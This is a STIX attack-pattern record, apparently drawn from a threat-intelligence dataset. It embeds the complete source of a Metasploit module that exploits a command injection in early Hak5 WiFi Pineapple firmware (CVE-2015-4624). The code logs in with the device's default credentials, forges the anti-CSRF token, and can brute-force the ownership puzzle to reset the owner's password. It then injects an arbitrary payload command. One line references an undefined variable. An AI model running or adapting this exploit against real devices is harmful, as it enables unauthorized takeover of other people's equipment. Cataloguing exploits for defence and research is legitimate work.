{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--29a60ae4-9b85-49b0-a5fa-5b7d7048b6bf",
    "created": "2024-08-14T17:04:45.641372Z",
    "modified": "2024-08-14T17:04:45.641377Z",
    "name": "Hak5 WiFi Pineapple Preconfiguration Command Injection",
    "description": " This module exploits a command injection vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4. We use a combination of default credentials with a weakness in the anti-csrf generation to achieve command injection on fresh pineapple devices prior to configuration. Additionally if default credentials fail you can enable a brute force solver for the proof-of-ownership challenge. This will reset the password to a known password if successful and may interrupt the user experience. These devices may typically be identified by their SSID beacons of 'Pineapple5_....'; details derived from the TospoVirus, a WiFi Pineapple infecting worm. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pineapple_preconfig_cmdinject.rb",
            "external_id": "pineapple_preconfig_cmdinject.rb"
        },
        {
            "source_name": "References=>CVE",
            "external_id": "2015-4624"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hak5 WiFi Pineapple Preconfiguration Command Injection',\n      'Description'    => %q{\n      This module exploits a command injection vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4.\n      We use a combination of default credentials with a weakness in the anti-csrf generation to achieve\n      command injection on fresh pineapple devices prior to configuration. Additionally if default credentials fail,\n      you can enable a brute force solver for the proof-of-ownership challenge. This will reset the password to a\n      known password if successful and may interrupt the user experience. These devices may typically be identified\n      by their SSID beacons of 'Pineapple5_....'; details derived from the TospoVirus, a WiFi Pineapple infecting\n      worm.\n      },\n      'Author'         => ['catatonicprime'],\n      'License'        => MSF_LICENSE,\n      'References'     => [[ 'CVE', '2015-4624' ]],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        => {\n        'Space'        => 2048,\n        'DisableNops'  => true,\n        'Compat'       => {\n          'PayloadType'  => 'cmd',\n          'RequiredCmd'  => 'generic python netcat telnet'\n        }\n      },\n      'Targets'        => [[ 'WiFi Pineapple 2.0.0 - 2.3.0', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-08-01'\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The username to use for login', 'root' ]),\n        OptString.new('PASSWORD', [ true, 'The password to use for login', 'pineapplesareyummy' ]),\n        OptString.new('PHPSESSID', [ true, 'PHPSESSID to use for attack', 'tospovirus' ]),\n        OptString.new('TARGETURI', [ true, 'Path to the command injection', '/components/system/configuration/functions.php' ]),\n        Opt::RPORT(1471),\n        Opt::RHOST('172.16.42.1')\n      ]\n    )\n    register_advanced_options(\n      [\n        OptBool.new('BruteForce', [ false, 'When true, attempts to solve LED puzzle after login failure', false ]),\n        OptInt.new('BruteForceTries', [ false, 'Number of tries to solve LED puzzle, 0 -> infinite', 0 ])\n      ]\n    )\n\n    deregister_options(\n      'ContextInformationFile',\n      'DOMAIN',\n      'DigestAuthIIS',\n      'EnableContextEncoding',\n      'FingerprintCheck',\n      'HttpClientTimeout',\n      'NTLM::SendLM',\n      'NTLM::SendNTLM',\n      'NTLM::SendSPN',\n      'NTLM::UseLMKey',\n      'NTLM::UseNTLM2_session',\n      'NTLM::UseNTLMv2',\n      'SSL',\n      'SSLVersion',\n      'VERBOSE',\n      'WORKSPACE',\n      'WfsDelay',\n      'Proxies',\n      'VHOST'\n    )\n  end\n\n  def login_uri\n    normalize_uri('includes', 'api', 'login.php')\n  end\n\n  def brute_uri\n    normalize_uri(\"/?action=verify_pineapple\")\n  end\n\n  def set_password_uri\n    normalize_uri(\"/?action=set_password\")\n  end\n\n  def phpsessid\n    datastore['PHPSESSID']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def cookie\n    \"PHPSESSID=#{phpsessid}\"\n  end\n\n  def csrf_token\n    Digest::SHA1.hexdigest datastore['PHPSESSID']\n  end\n\n  def use_brute\n    datastore['BruteForce']\n  end\n\n  def use_brute_tries\n    datastore['BruteForceTries']\n  end\n\n  def login\n    # Create a request to login with the specified credentials.\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => login_uri,\n      'vars_post' => {\n        'username'   => username,\n        'password'   => password,\n        'login'      => \"\" # Merely indicates to the pineapple that we'd like to login.\n      },\n      'headers'   => {\n        'Cookie'     => cookie\n      }\n    )\n\n    return nil unless res\n\n    # Successful logins in preconfig pineapples include a 302 to redirect you to the \"please config this device\" pages\n    return res if res.code == 302 && (res.body !~ /invalid username/)\n\n    # Already logged in message in preconfig pineapples are 200 and \"Invalid CSRF\" - which also indicates a success\n    return res if res.code == 200 && (res.body =~ /Invalid CSRF/)\n\n    nil\n  end\n\n  def cmd_inject(cmd)\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => target_uri.path,\n      'cookie'    => cookie,\n      'vars_get'  => {\n        'execute' => \"\" # Presence triggers command execution\n      },\n      'vars_post' => {\n        '_csrfToken' => csrf_token,\n        'commands'   => cmd\n      }\n    )\n\n    res\n  end\n\n  def brute_force\n    print_status('Beginning brute forcing...')\n    # Attempt to get a new session cookie with an LED puzzle tied to it.\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => brute_uri\n    )\n\n    # Confirm the response indicates there is a puzzle to be solved.\n    if !res || !(res.code == 200) || res.body !~ /own this pineapple/\n      print_status('Brute forcing not available...')\n      return nil\n    end\n\n    cookies = res.get_cookies\n    counter = 0\n    while use_brute_tries.zero? || counter < use_brute_tries\n      print_status(\"Try #{counter}...\") if (counter % 5).zero?\n      counter += 1\n      res = send_request_cgi(\n        'method'    => 'POST',\n        'uri'       => brute_uri,\n        'cookie'    => cookies,\n        'vars_post' => {\n          'green'            => 'on',\n          'amber'            => 'on',\n          'blue'             => 'on',\n          'red'              => 'on',\n          'verify_pineapple' => 'Continue'\n        }\n      )\n\n      if res && res.code == 200 && res.body =~ /set_password/\n        print_good('Successfully solved puzzle!')\n        return write_password(cookies)\n      end\n    end\n    print_warning(\"Failed to brute force puzzle in #{counter} tries...\")\n    nil\n  end\n\n  def write_password(cookies)\n    print_status(\"Attempting to set password to: #{password}\")\n    res = send_request_cgi(\n      'method'     => 'POST',\n      'uri'        => set_password_uri,\n      'cookie'     => cookies,\n      'vars_post'  => {\n        'password'     => password,\n        'password2'    => password,\n        'eula'         => 1,\n        'sw_license'   => 1,\n        'set_password' => 'Set Password'\n      }\n    )\n    if res && res.code == 200 && res.body =~ /success/\n      print_good('Successfully set password!')\n      return res\n    end\n    print_warning('Failed to set password')\n\n    nil\n  end\n\n  def check\n    loggedin = login\n    unless loggedin\n      brutecheck = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => brute_uri\n      )\n      return Exploit::CheckCode::Safe if !brutecheck || !brutecheck.code == 200 || brutecheck.body !~ /own this pineapple/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    cmd_success = cmd_inject(\"echo\")\n    return Exploit::CheckCode::Vulnerable if cmd_success && cmdSuccess.code == 200 && cmd_success.body =~ /Executing/\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Logging in with credentials...')\n    loggedin = login\n    if !loggedin && use_brute\n      brute_force\n      loggedin = login\n    end\n    unless loggedin\n      fail_with(Failure::NoAccess, \"Failed to login PHPSESSID #{phpsessid} with #{username}:#{password}\")\n    end\n\n    print_status('Executing payload...')\n    cmd_inject(\"#{payload.encoded}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-01",
    "x_mitre_platforms": [
        "['unix']"
    ]
}